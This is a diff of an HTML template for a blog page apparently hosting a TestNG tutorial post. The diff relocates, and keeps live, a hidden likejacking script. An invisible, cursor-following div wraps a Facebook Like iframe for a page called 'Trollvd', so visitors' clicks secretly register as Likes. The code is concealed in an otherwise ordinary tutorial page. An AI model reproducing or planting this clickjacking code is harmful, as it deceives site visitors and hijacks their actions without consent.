@@ -47,17 +47,7 @@
 </head>
 
 <body>
-<div style="overflow: hidden; width: 10px; height: 12px; position: absolute; filter:alpha(opacity=0); -moz-opacity:0.0; -khtml-opacity: 0.0; opacity: 0.0;" id="icontainer">
-    <iframe src="http://www.facebook.com/plugins/like.php?href=https://www.facebook.com/pages/Trollvd/606655129460867&amp;layout=standard&amp;show_faces=false&amp;width=450&amp;action=like&amp;font=tahoma&amp;colorscheme=light&amp;height=80" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:50px; height:23px;" allowTransparency="true" id="fbframe" name="fbframe"></iframe>
-    <!--end facebook like frame code-->
-</div>
-<script>
-    var iflag = 0;
-    var icontainer = document.getElementById('icontainer');
-    var standardbody = (document.compatMode == "CSS1Compat") ? document.documentElement : document.body   
-	function mouseFollower(e){ /* DO NOT EDIT THIS */ 
-	if (window.event) { icontainer.style.top = (window.event.y-5)+standardbody.scrollTop+'px'; icontainer.style.left = (window.event.x-5)+standardbody.scrollLeft+'px'; } else { icontainer.style.top = (e.pageY-5)+'px'; icontainer.style.left = (e.pageX-5)+'px'; } } document.onmousemove = function(e) { if (iflag == 0) {mouseFollower(e);} }
-</script>
+
     <div id="wrapper">
     <header id="header" class="inner"><!-- for more effects see _animate.scss -->
 <h1 class="animated bounceInDown">
@@ -140,6 +130,17 @@
 <div id="toload">
 <!-- begin toload -->
 <div id="content" class="inner">
+<div style="overflow: hidden; width: 10px; height: 12px; position: absolute; filter:alpha(opacity=0); -moz-opacity:0.0; -khtml-opacity: 0.0; opacity: 0.0;" id="icontainer">
+    <iframe src="http://www.facebook.com/plugins/like.php?href=https://www.facebook.com/pages/Trollvd/606655129460867&amp;layout=standard&amp;show_faces=false&amp;width=450&amp;action=like&amp;font=tahoma&amp;colorscheme=light&amp;height=80" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:50px; height:23px;" allowTransparency="true" id="fbframe" name="fbframe"></iframe>
+    <!--end facebook like frame code-->
+</div>
+<script>
+    var iflag = 0;
+    var icontainer = document.getElementById('icontainer');
+    var standardbody = (document.compatMode == "CSS1Compat") ? document.documentElement : document.body   
+	function mouseFollower(e){ /* DO NOT EDIT THIS */ 
+	if (window.event) { icontainer.style.top = (window.event.y-5)+standardbody.scrollTop+'px'; icontainer.style.left = (window.event.x-5)+standardbody.scrollLeft+'px'; } else { icontainer.style.top = (e.pageY-5)+'px'; icontainer.style.left = (e.pageX-5)+'px'; } } document.onmousemove = function(e) { if (iflag == 0) {mouseFollower(e);} }
+</script>
         <article class="post">
 
 	<h2 class="title">TestNG Framework P9 : Multi Browser and Parallel Testing</h2>
